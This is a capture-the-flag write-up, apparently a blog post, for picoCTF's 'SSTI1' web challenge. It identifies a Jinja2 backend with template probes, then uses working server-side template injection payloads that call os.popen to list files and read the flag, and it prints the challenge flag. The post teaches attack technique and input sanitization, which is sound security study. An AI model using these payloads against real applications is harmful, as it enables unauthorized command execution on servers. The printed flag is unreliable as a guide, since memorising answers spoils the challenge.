---

title: "# SSTI1"
date: 2026-06-05
draft: false
tags: ["picoctf", "forensics", "metadata", "exiftool"]
------------------------------------------------------
# Description:
I made a cool website where you can announce whatever you want! 
Try it out!
I heard templating is a cool and modular way to build web apps! 
Check out my website here!
### Hints:
1. Server Side Template Injection

# Solution
Browse to the web site and you will see a web page that includes the text

### Verify SSTI
The hint has already given away that the site uses [server-side templates](https://portswigger.net/web-security/server-side-template-injection) but we need to verify that and find out the backend technology used.

To our help we use the following decision tree from [PortSwiggers page on Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)

SSTI Decision Tree


![Alt Text](https://github.com/Cajac/picoCTF-Writeups/blob/main/picoCTF_2025/Web_Exploitation/Images/SSTI_Decision_Tree.png)


The tests done are as follows:

Entering ${7*7} yields ${7*7},  
Entering {{7*7}} yields 49 and  
{{7*'7'}} yields 7777777  

So now we know we have a Jinja2 backend.

Googling around for SSTI Jinja2-payloads I found this one:` {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`

Look for the flag
Using the payload` {{request.application.__globals__.__builtins__.__import__('os').popen('ls -l').read()}} `
              
drwxr-xr-x 2 root root   32 Apr 12 10:09 __pycache__  
-rwxr-xr-x 1 root root 1241 Mar  6 03:27 app.py  
-rw-r--r-- 1 root root   58 Mar  6 19:44 flag  
-rwxr-xr-x 1 root root  268 Mar  6 03:27 requirements.txt  
</h1>
So now we have the name and location of the flag

Get the flag
We get the flag with the payload` {{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}  `


picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_eb0c6390}  
## 🧠 Learning Outcomes:
Understanding SSTI and how it leads to remote code execution when user input is rendered unsafely.

How to identify template engines through different syntax tests.

Basic command execution via Python’s os.popen() through template injection.

Importance of input sanitization in templating systems.
